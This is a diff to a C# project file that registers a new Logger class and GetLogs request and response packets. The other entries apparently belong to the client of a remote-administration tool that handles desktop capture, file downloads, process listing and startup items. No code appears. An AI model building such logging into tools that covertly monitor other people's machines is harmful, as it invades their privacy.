@@ -64,10 +64,12 @@
     <Compile Include="Core\Information\OSInfo.cs" />
     <Compile Include="Core\Compression\JpgCompression.cs" />
     <Compile Include="Core\Extensions\SocketExtensions.cs" />
+    <Compile Include="Core\Logger.cs" />
     <Compile Include="Core\Packets\ClientPackets\DesktopResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\DirectoryResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\DownloadFileResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\DrivesResponse.cs" />
+    <Compile Include="Core\Packets\ClientPackets\GetLogsResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetProcessesResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetStartupItemsResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetSystemInfoResponse.cs" />
@@ -82,6 +84,7 @@
     <Compile Include="Core\Packets\ServerPackets\DownloadFile.cs" />
     <Compile Include="Core\Packets\ServerPackets\DownloadFileCanceled.cs" />
     <Compile Include="Core\Packets\ServerPackets\Drives.cs" />
+    <Compile Include="Core\Packets\ServerPackets\GetLogs.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetProcesses.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetStartupItems.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetSystemInfo.cs" />
